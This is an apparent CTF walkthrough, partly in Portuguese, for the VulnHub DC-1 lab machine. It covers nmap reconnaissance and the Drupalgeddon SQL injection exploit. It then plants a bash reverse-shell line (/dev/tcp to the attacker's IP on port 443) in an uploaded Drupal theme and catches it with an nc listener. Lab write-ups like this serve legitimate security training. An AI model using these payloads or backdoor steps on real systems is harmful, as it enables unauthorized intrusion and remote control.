

https://www.vulnhub.com/entry/dc-1-1,292/#download

 Walkthrough
https://www.youtube.com/watch?v=Sk4XWFJruVk&list=PLHBDBcFA_l_WBcUJWf8cp5BaPsUkquRQU&index=11


CTF Walkthrough Guide
1. Setup Instructions
Setup your virtual machine and network configuration.


2. Reconnaissance (Recon)
Perform Nmap scan to identify open ports and services.
Analyze the services running on the target machine.

netdiscover -r <10.10.10.0/24>

nmap -sV -v -Pn <10.10.10.9>
nmap -sC -A -v -p-  <10.10.10.9>

Scan Results: 
Service Info:
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 6.0p1 Debian 4+deb7u7 (protocol 2.0)
80/tcp  open  http    Apache httpd 2.2.22 ((Debian))                   Drupal   -robots.txt:
111/tcp open  rpcbind 2-4 (RPC #100000)



3. Enumeration
Enumerate services such as FTP, HTTP, SSH, etc.
Look for valuable files and potential weaknesses.


4. Vulnerability Identification
Identify potential vulnerabilities based on the reconnaissance and enumeration.
Search for public exploits, misconfigurations, or weak service versions.

nmap -sV -sC -v 10.10.10.9

achamos o Drupal 7.0 < 7.31.
searchsploit Drupal / https://www.exploit-db.com/exploits/34984

Achamos essa vulnerabilidade: Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection (PoC) (Reset Password) (1), ela vai inserir um usuario e senha dentro do banco 
de dados.

O exploite esta em uma versão diferente do python, se der erro use IA ou voce mesmo pode fazer as auterações, preste atenção, vão ser dois scripts,
um dentro do exploit-db e outro no git, eles devem ser salvos em formatos .py. 

vi exploit.py (ser der erro verifique a versão do python)
drupalpass.py (ser der erro verifique a versão do python)

# python exploit.py http://10.10.10.9/node?destination=node seuusuario suasenha
Success!
Login now with user:seu-usuario and pass:sua-senha


5. Exploitation
Exploit vulnerabilities to gain access to the system.
Use tools like Metasploit, Hydra, or custom scripts.

Entranos no drupal com senha e usuario, ainda não temos acesso root.
No Drupal vimos a possibilidade de fazer instalação de um theme uppando ele atraves da maquina atacante.
vai direto no site do drupal baxe o theme que esta no formato php, insira dendtro do template.php o scrip malicioso/backdoor;

add essa linha de scrip no inicio do php 
exec("/bin/bash -c 'bash -i >& /dev/tcp/ip-maq-ataque/443 0>&1'");
Salve o arquivo e compacteo novamente.
faça o upload e instalação do thema no drupal, não mude de thema antes de ativar o nc.

nc -nvlp 443 
ative o adminstratio theme na qual foi colocado o backdoor.


6. Privilege Escalation
Attempt to escalate privileges from a limited user to root.
Explore file permissions, configuration files, and environment variables.




7. Post-Exploitation
Maintain access, collect additional flags, or prepare for further exploitation.
Investigate further vulnerabilities and opportunities for additional access.

no need

8. Flag Collection
Locate and capture flags (usually text files or output from certain commands).
Flag collection might be in different formats (e.g., flag.txt or output from a successful command).

cd /root
flag.txt

9. Conclusion
Summarize your successful exploitation.
Review any lessons learned or tools/techniques that were effective
